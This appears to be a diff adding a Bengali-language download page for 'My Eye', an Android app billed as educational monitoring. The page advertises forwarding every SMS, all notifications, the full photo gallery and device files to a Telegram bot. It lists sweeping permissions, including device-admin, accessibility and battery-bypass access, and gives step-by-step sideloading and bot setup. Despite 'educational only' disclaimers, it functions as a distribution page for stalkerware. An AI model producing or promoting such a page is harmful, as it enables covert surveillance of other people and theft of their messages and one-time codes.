@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Eye - Educational Monitoring App</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <i class="fas fa-eye"></i> My Eye
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item"><a class="nav-link" href="#home">হোম</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#features">বৈশিষ্ট্য</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#permissions">পারমিশন</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#setup">সেটআপ</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#developer">ডেভেলপার</a></li>
+                    <li class="nav-item"><a class="nav-link" href="privacy.html">গোপনীয়তা</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Warning Banner -->
+    <div class="warning-banner">
+        <div class="container">
+            <i class="fas fa-exclamation-triangle"></i>
+            <strong>শিক্ষামূলক উদ্দেশ্যে তৈরি</strong> - শুধুমাত্র আইনানুগ ব্যবহারের জন্য। অনুমতি ছাড়া ব্যবহার নিষিদ্ধ।
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <section id="home" class="hero-section">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-6">
+                    <h1 class="display-4">My Eye</h1>
+                    <h3>Remote Monitoring App</h3>
+                    <p class="lead">একটি শিক্ষামূলক অ্যাপ যা আপনাকে ডিভাইস মনিটরিং সম্পর্কে শেখাবে</p>
+                    
+                    <div class="mt-4">
+                        <button class="btn btn-primary btn-lg" onclick="downloadApp()">
+                            <i class="fas fa-download"></i> APK ডাউনলোড (v1.0)
+                        </button>
+                        <a href="#setup" class="btn btn-outline-light btn-lg ms-2">
+                            <i class="fas fa-book"></i> ব্যবহার গাইড
+                        </a>
+                    </div>
+                    
+                    <div class="requirements mt-4">
+                        <p><i class="fas fa-check-circle"></i> Android 8.0+</p>
+                        <p><i class="fas fa-check-circle"></i> ইন্টারনেট কানেকশন</p>
+                        <p><i class="fas fa-check-circle"></i> টেলিগ্রাম অ্যাকাউন্ট</p>
+                    </div>
+                </div>
+                <div class="col-lg-6">
+                    <img src="https://img.icons8.com/color/480/000000/android-os.png" alt="App Logo" class="img-fluid app-logo">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="features-section">
+        <div class="container">
+            <h2 class="text-center mb-5">অ্যাপের বৈশিষ্ট্যসমূহ</h2>
+            <div class="row">
+                <div class="col-md-3">
+                    <div class="feature-card">
+                        <i class="fas fa-sms"></i>
+                        <h4>এসএমস মনিটরিং</h4>
+                        <p>সকল ইনকামিং/আউটগোয়িং এসএমস রিয়েল-টাইমে টেলিগ্রামে ফরওয়ার্ড</p>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="feature-card">
+                        <i class="fas fa-bell"></i>
+                        <h4>নোটিফিকেশন</h4>
+                        <p>সকল অ্যাপের নোটিফিকেশন ক্যাপচার ও রিপোর্ট</p>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="feature-card">
+                        <i class="fas fa-images"></i>
+                        <h4>গ্যালারি এক্সেস</h4>
+                        <p>সমস্ত ফটো ও ভিডিও স্বয়ংক্রিয়ভাবে ব্যাকআপ</p>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="feature-card">
+                        <i class="fas fa-file"></i>
+                        <h4>ফাইল ম্যানেজমেন্ট</h4>
+                        <p>ডিভাইসের সকল ফাইল দেখা ও ডাউনলোড করা</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Permissions Section -->
+    <section id="permissions" class="permissions-section">
+        <div class="container">
+            <h2 class="text-center mb-5">প্রয়োজনীয় পারমিশনসমূহ</h2>
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="permission-list">
+                        <h4><i class="fas fa-shield-alt"></i> Android পারমিশন</h4>
+                        <ul>
+                            <li><code>READ_SMS</code> - এসএমস পড়ার জন্য</li>
+                            <li><code>RECEIVE_SMS</code> - এসএমস গ্রহণের জন্য</li>
+                            <li><code>READ_NOTIFICATIONS</code> - নোটিফিকেশন পড়ার জন্য</li>
+                            <li><code>READ_EXTERNAL_STORAGE</code> - স্টোরেজ এক্সেস</li>
+                            <li><code>WRITE_EXTERNAL_STORAGE</code> - স্টোরেজে লেখার জন্য</li>
+                            <li><code>INTERNET</code> - নেটওয়ার্ক এক্সেস</li>
+                            <li><code>FOREGROUND_SERVICE</code> - ব্যাকগ্রাউন্ড সার্ভিস</li>
+                            <li><code>BIND_NOTIFICATION_LISTENER_SERVICE</code> - নোটিফিকেশন শোনার জন্য</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="permission-list">
+                        <h4><i class="fas fa-cogs"></i> বিশেষ এক্সেস</h4>
+                        <ul>
+                            <li>নোটিফিকেশন এক্সেস সার্ভিস</li>
+                            <li>বেটারি অপ্টিমাইজেশন বাইপাস</li>
+                            <li>অটো-স্টার্ট পারমিশন</li>
+                            <li>ডিভাইস অ্যাডমিন এক্সেস (ঐচ্ছিক)</li>
+                            <li>অ্যাক্সেসিবিলিটি সার্ভিস (ঐচ্ছিক)</li>
+                        </ul>
+                        <div class="alert alert-warning mt-3">
+                            <i class="fas fa-exclamation-circle"></i>
+                            <strong>দ্রষ্টব্য:</strong> সকল পারমিশন অনুমোদন করতে হবে পুরো কার্যকারিতার জন্য
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Setup Guide -->
+    <section id="setup" class="setup-section">
+        <div class="container">
+            <h2 class="text-center mb-5">ইন্সটলেশন ও সেটআপ গাইড</h2>
+            <div class="setup-steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <h4>APK ডাউনলোড করুন</h4>
+                        <p>উপরে ডাউনলোড বাটনে ক্লিক করে APK ফাইল ডাউনলোড করুন</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <h4>Unknown Sources এনাবল করুন</h4>
+                        <p>Settings → Security → Unknown Sources সক্রিয় করুন</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <h4>অ্যাপ ইন্সটল করুন</h4>
+                        <p>ডাউনলোড করা APK ফাইলটি ইন্সটল করুন</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div class="step-content">
+                        <h4>পারমিশন দিন</h4>
+                        <p>অ্যাপ চালু করে সকল পারমিশন অনুমোদন করুন</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">5</div>
+                    <div class="step-content">
+                        <h4>টেলিগ্রাম বট সেটআপ</h4>
+                        <p>@BotFather থেকে বট তৈরি করে টোকেন ও Chat ID দিন</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">6</div>
+                    <div class="step-content">
+                        <h4>কনফিগারেশন সম্পন্ন করুন</h4>
+                        <p>সেটিংস সেভ করে সার্ভিস চালু করুন</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Telegram Bot Setup -->
+            <div class="telegram-setup mt-5">
+                <h3 class="text-center mb-4">টেলিগ্রাম বট তৈরি করুন</h3>
+                <div class="row">
+                    <div class="col-md-4">
+                        <div class="bot-step">
+                            <h5>ধাপ ১: @BotFather খুঁজুন</h5>
+                            <p>টেলিগ্রামে @BotFather সার্চ করুন</p>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="bot-step">
+                            <h5>ধাপ ২: নতুন বট তৈরি</h5>
+                            <p>/newbot কমান্ড পাঠান ও নির্দেশনা অনুসরণ করুন</p>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="bot-step">
+                            <h5>ধাপ ৩: টোকেন সংগ্রহ</h5>
+                            <p>API টোকেন কপি করে অ্যাপে পেস্ট করুন</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="text-center mt-4">
+                    <a href="https://core.telegram.org/bots#how-do-i-create-a-bot" target="_blank" class="btn btn-info">
+                        <i class="fab fa-telegram"></i> সম্পূর্ণ গাইড পড়ুন
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Developer Section -->
+    <section id="developer" class="developer-section">
+        <div class="container">
+            <h2 class="text-center mb-5">ডেভেলপার পরিচিতি</h2>
+            <div class="row">
+                <div class="col-md-4 text-center">
+                    <img src="https://i.ibb.co/tpJ02rMC/developer.jpg" alt="Ahamed Rahim" class="developer-img">
+                    <h3 class="mt-3">Ahamed Rahim</h3>
+                    <p class="text-muted">অ্যাপ ডেভেলপার</p>
+                </div>
+                <div class="col-md-8">
+                    <div class="developer-info">
+                        <h4>পরিচয়</h4>
+                        <p>আমি একজন আগ্রহী প্রোগ্রামার যার উদ্দেশ্য শিক্ষামূলক টেকনোলজি তৈরি করা। "My Eye" অ্যাপটি তৈরি করা হয়েছে শুধুমাত্র শিক্ষামূলক ও গবেষণার উদ্দেশ্যে।</p>
+                        
+                        <h4 class="mt-4">শিক্ষাগত যোগ্যতা</h4>
+                        <p>কম্পিউটার সায়েন্স এন্ড ইঞ্জিনিয়ারিং-এ আগ্রহী, অ্যান্ড্রয়েড ডেভেলপমেন্টে বিশেষজ্ঞ।</p>
+                        
+                        <h4 class="mt-4">যোগাযোগ</h4>
+                        <div class="developer-links">
+                            <a href="https://ahamed-rahim.pages.dev/" target="_blank" class="btn btn-outline-primary">
+                                <i class="fas fa-globe"></i> ওয়েবসাইট
+                            </a>
+                            <a href="https://github.com/ahamed-rahim" target="_blank" class="btn btn-outline-dark">
+                                <i class="fab fa-github"></i> GitHub
+                            </a>
+                            <a href="mailto:contact@ahamed-rahim.dev" class="btn btn-outline-success">
+                                <i class="fas fa-envelope"></i> ইমেইল
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6">
+                    <h5><i class="fas fa-eye"></i> My Eye</h5>
+                    <p>শিক্ষামূলক মনিটরিং অ্যাপ্লিকেশন</p>
+                    <p class="disclaimer">
+                        <small>
+                            এই অ্যাপটি শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে তৈরি। 
+                            অনুমতি ছাড়া অন্য কোন ডিভাইসে ব্যবহার আইনগত অপরাধ। 
+                            ব্যবহারের পূর্বে স্থানীয় আইন পরীক্ষা করুন।
+                        </small>
+                    </p>
+                </div>
+                <div class="col-md-3">
+                    <h5>লিংক</h5>
+                    <ul class="footer-links">
+                        <li><a href="#home">হোম</a></li>
+                        <li><a href="#features">বৈশিষ্ট্য</a></li>
+                        <li><a href="#setup">সেটআপ</a></li>
+                        <li><a href="privacy.html">গোপনীয়তা নীতি</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h5>ডাউনলোড</h5>
+                    <button class="btn btn-outline-light w-100 mb-2" onclick="downloadApp()">
+                        <i class="fas fa-download"></i> APK (v1.0)
+                    </button>
+                    <small>Android 8.0+ সংস্করণ</small>
+                </div>
+            </div>
+            <hr>
+            <div class="text-center">
+                <p>&copy; 2024 My Eye App. Developed by Ahamed Rahim. For Educational Purpose Only.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Download Modal -->
+    <div class="modal fade" id="downloadModal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">ডাউনলোড কনফার্মেশন</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="alert alert-warning">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <strong>গুরুত্বপূর্ণ নোট:</strong><br>
+                        ১. এই অ্যাপ শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে<br>
+                        ২. আইনগত অনুমতি ছাড়া ব্যবহার করবেন না<br>
+                        ৩. শুধুমাত্র আপনার নিজের ডিভাইসে ব্যবহার করুন
+                    </div>
+                    <p>আপনি কি APK ডাউনলোড করতে চান?</p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">বাতিল</button>
+                    <button type="button" class="btn btn-primary" onclick="startDownload()">ডাউনলোড করুন</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="script.js"></script>
+</body>
+                              </html>
